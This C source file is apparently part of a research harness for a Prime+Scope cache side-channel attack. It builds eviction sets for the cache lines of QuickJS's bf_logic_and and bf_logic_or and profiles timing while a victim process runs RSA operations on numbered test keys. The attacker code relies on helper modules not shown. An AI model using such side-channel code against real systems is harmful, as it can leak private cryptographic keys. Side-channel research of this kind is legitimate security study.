#include "arch.h"
#include "cache.h"
#include "cache/cache_param.h"
#include "cache/helper_thread.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "quickjs_runtime.h"
#include "quickjs/libbf.h"
#include "quickjs/quickjs-libc.h"
#include "shared_memory.h"

#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

enum { cache_line_count = 2, profile_iterations = 1 << 20 };

static int probe_count = 1;
static int probe_and_only = 0;

static uint64_t victim_runs = 5;
static uint64_t key_id = 0;

static uint64_t max_exec_cycles = (uint64_t)4e9;
static const char *test_name = "quickjs_bigint_select_rsa";

static uint64_t probe_time_arr[cache_line_count][profile_iterations];
static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];

static PS_attacker_thread_config_t pt_bf_logic_and;
static PS_attacker_thread_config_t pt_bf_logic_or;
static pthread_barrier_t attacker_threads_barrier;

static uintptr_t target_bf_logic_and;
static uintptr_t target_bf_logic_or;

static void get_select_targets(void) {
	target_bf_logic_and = (uintptr_t)&bf_logic_and & CACHE_LINE_MASK;
	target_bf_logic_or = (uintptr_t)&bf_logic_or & CACHE_LINE_MASK;

	log_info("bf_logic_and %p -> line %lx; bf_logic_or %p -> line %lx; "
	         "bf_rint %p (line %lx)",
	         (void *)&bf_logic_and,
	         target_bf_logic_and,
	         (void *)&bf_logic_or,
	         target_bf_logic_or,
	         (void *)&bf_rint,
	         (uintptr_t)&bf_rint & CACHE_LINE_MASK);

	if ((((uintptr_t)&bf_rint) & CACHE_LINE_MASK) != target_bf_logic_or)
		log_info("note: bf_rint is NOT on the bf_logic_or line in this build; "
		         "the record counts quoted at the top of this file no longer "
		         "apply");
	if (target_bf_logic_and == target_bf_logic_or)
		log_error("bf_logic_and and bf_logic_or share a cache line in this "
		          "build -- the two probes are not separable");
}

static int build_select_evsets(void) {
	helper_thread_ctrl hctrl;
	if (start_helper_thread(&hctrl)) {
		log_error("Failed to start helper thread");
		return 0;
	}

	static const int retry = 4;

	uint8_t *targets[cache_line_count] = {
		(uint8_t *)(probe_and_only ? target_bf_logic_and : target_bf_logic_or),
		(uint8_t *)(probe_and_only ? target_bf_logic_or : target_bf_logic_and),
	};
	EVSet **evsets[cache_line_count] = {
		probe_and_only ? &pt_bf_logic_and.evset : &pt_bf_logic_or.evset,
		probe_and_only ? &pt_bf_logic_or.evset : &pt_bf_logic_and.evset
	};
	const char *labels[cache_line_count] = {
		probe_and_only ? "bf_logic_and" : "bf_logic_or",
		probe_and_only ? "bf_logic_or" : "bf_logic_and"
	};

	for (int i = 0; i < probe_count; ++i) {
		for (int r = 0; r < retry && *evsets[i] == NULL; ++r) {
			*evsets[i] = prepare_evset(targets[i], &hctrl);
		}
		if (*evsets[i] == NULL) {
			log_error("Failed to build evset for %s", labels[i]);
			stop_helper_thread(&hctrl);
			return 0;
		}
		log_info("Built evset for %s: %p", labels[i], (void *)*evsets[i]);
	}

	stop_helper_thread(&hctrl);
	return 1;
}

static void profile_select_rsa(void) {
	pthread_t thread0 = 0, thread1 = 0;
	char test_key_name[256];
	int err;

	if (pthread_barrier_init(&attacker_threads_barrier, NULL, probe_count) !=
	    0) {
		log_error("Error initializing attacker thread barrier");
		return;
	}

	snprintf(test_key_name,
	         sizeof(test_key_name),
	         "%s/%s_key%05lu",
	         test_name,
	         test_name,
	         (unsigned long)key_id);
	pt_bf_logic_and.test_name = test_key_name;
	pt_bf_logic_or.test_name = test_key_name;

	snprintf((char *)sync_ctx.data,
	         sync_ctx_data_size,
	         "KEY_ID=%lu",
	         (unsigned long)key_id);

	log_info("Prime+Scope waiting for victim warm-up");
	pthread_barrier_wait(sync_ctx.barrier);
	log_info("Prime+Scope warm-up done");

	PS_attacker_thread_config_t *first =
	    probe_and_only ? &pt_bf_logic_and : &pt_bf_logic_or;
	err = pthread_create(&thread0, NULL, PS_attacker_thread, first);
	if (err != 0)
		log_error("can't create %s thread :[%s]", first->label, strerror(err));

	if (probe_count > 1) {
		err = pthread_create(
		    &thread1, NULL, PS_attacker_thread, &pt_bf_logic_and);
		if (err != 0)
			log_error("can't create bf_logic_and thread :[%s]", strerror(err));
	}

	pthread_join(thread0, NULL);
	if (thread1 != 0)
		pthread_join(thread1, NULL);

	pthread_barrier_destroy(&attacker_threads_barrier);

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}

static void parse_env_u64(const char *name, uint64_t *out) {
	const char *v = getenv(name);
	if (v == NULL)
		return;
	char *endptr;
	errno = 0;
	uint64_t value = strtoull(v, &endptr, 10);
	if (errno == 0 && endptr != v && *endptr == '\0')
		*out = value;
}

int main(int argc, char **argv) {
	get_config();
	init_sync_ctx(QUICKJS_PROJ_ID);
	quickjs_get_bytecode_handler_cacheline();
	get_select_targets();

	srand(time(NULL));

	parse_env_u64("VICTIM_RUNS", &victim_runs);
	parse_env_u64("KEY_ID", &key_id);
	parse_env_u64("ROUND_CYCLES", &max_exec_cycles);

	const char *probe_line = getenv("PROBE_LINE");
	if (probe_line == NULL || strcmp(probe_line, "or") == 0) {
		probe_count = 1;
	} else if (strcmp(probe_line, "and") == 0) {
		probe_count = 1;
		probe_and_only = 1;
	} else if (strcmp(probe_line, "both") == 0) {
		probe_count = 2;
	} else {
		log_error("Invalid PROBE_LINE '%s' (expected or|and|both)", probe_line);
		return -1;
	}

	if (argc > 1) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(argv[1], &endptr, 10);
		if (errno == 0 && endptr != argv[1] && *endptr == '\0' && value > 0) {
			victim_runs = value;
		} else {
			log_error("Invalid victim_runs argument '%s'", argv[1]);
			return -1;
		}
	}

	log_info("Config: victim_runs=%lu, key_id=%lu, max_exec_cycles=%lu, "
	         "probe_count=%d (%s)",
	         (unsigned long)victim_runs,
	         (unsigned long)key_id,
	         (unsigned long)max_exec_cycles,
	         probe_count,
	         probe_count > 1 ? "bf_logic_or + bf_logic_and"
	                         : (probe_and_only ? "bf_logic_and only"
	                                           : "bf_logic_or only"));

	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!");
		return 1;
	}

	for (int i = 0; i < cache_line_count; ++i) {
		sample_tsc[i] = sample_tsc_arr[i];
		probe_time[i] = probe_time_arr[i];
	}

	PS_thread_config_init(pt_bf_logic_or);
	pt_bf_logic_or.label = "bf_logic_or";
	pt_bf_logic_or.slot = probe_and_only ? 1 : 0;
	pt_bf_logic_or.pin_cpu = -1;
	pt_bf_logic_or.target = (uint8_t *)target_bf_logic_or;
	pt_bf_logic_or.cache_line_count = probe_count;

	PS_thread_config_init(pt_bf_logic_and);
	pt_bf_logic_and.label = "bf_logic_and";
	pt_bf_logic_and.slot = probe_and_only ? 0 : 1;
	pt_bf_logic_and.pin_cpu = -1;
	pt_bf_logic_and.target = (uint8_t *)target_bf_logic_and;
	pt_bf_logic_and.cache_line_count = probe_count;

	if (!build_select_evsets()) {
		log_error("Could not build evsets for the bf_logic lines");

		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier);
		return -1;
	}

	profile_select_rsa();
	return 0;
}
